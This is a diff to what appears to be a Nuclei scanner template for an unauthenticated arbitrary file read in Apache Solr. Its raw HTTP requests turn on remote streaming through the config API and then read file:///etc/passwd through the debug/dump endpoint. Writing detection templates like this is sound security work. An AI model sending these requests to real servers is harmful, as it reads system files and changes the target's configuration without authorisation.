@@ -1,12 +1,12 @@
-id: solrbear
+id: apache-solr-lfi
 
 info:
-  name: Apache Solr file information disclosure
+  name: Apache Solr <= 8.8.1 arbitrary file reading
   author: z3bd
-  severity: low
+  severity: info
   reference: https://mp.weixin.qq.com/s/3WuWUGO61gM0dBpwqTfenQ
   description: An unauthenticated user can read the filesystem as the solr user
-  tags: solr,leak
+  tags: solr,lfi
 
 requests:
   - raw:
@@ -14,30 +14,39 @@ requests:
         GET /solr/admin/cores HTTP/1.1
         Host: {{Hostname}}
         User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+
       - |
-        POST /solr/{{core}}/debug/dump?param=ContentStreams HTTP/1.1
+        POST /solr/gettingstarted/config HTTP/1.1
         Host: {{Hostname}}
-        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
         Accept: */*
-        Content-Type: multipart/form-data; boundary=------------------------deadbeefdeadbeef
-        Connection: close
-        --------------------------deadbeefdeadbeef
+        Content-type:application/json
+        Content-Length: 82
+        
+        {"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}
+
+      - |
+        POST /solr/gettingstarted/debug/dump?param=ContentStreams HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Length: 161
+        Content-Type: multipart/form-data; boundary=------------------------25d19388b98c5d9e
+        
+        --------------------------25d19388b98c5d9e
         Content-Disposition: form-data; name="stream.url"
+        
         file:///etc/passwd
-        --------------------------deadbeefdeadbeef--
+        --------------------------25d19388b98c5d9e--
 
     extractors:
       - type: regex
         name: core
         part: body
         internal: true
-        group: 1
+        group: 2
         regex:
           - '("name":")([^"]*)'
-          
+
     matchers:
       - type: regex
         regex:
-          - "root:[x*]:0:0"
-        condition: and
-        part: body
+          - "root:[x*]:0:0:"
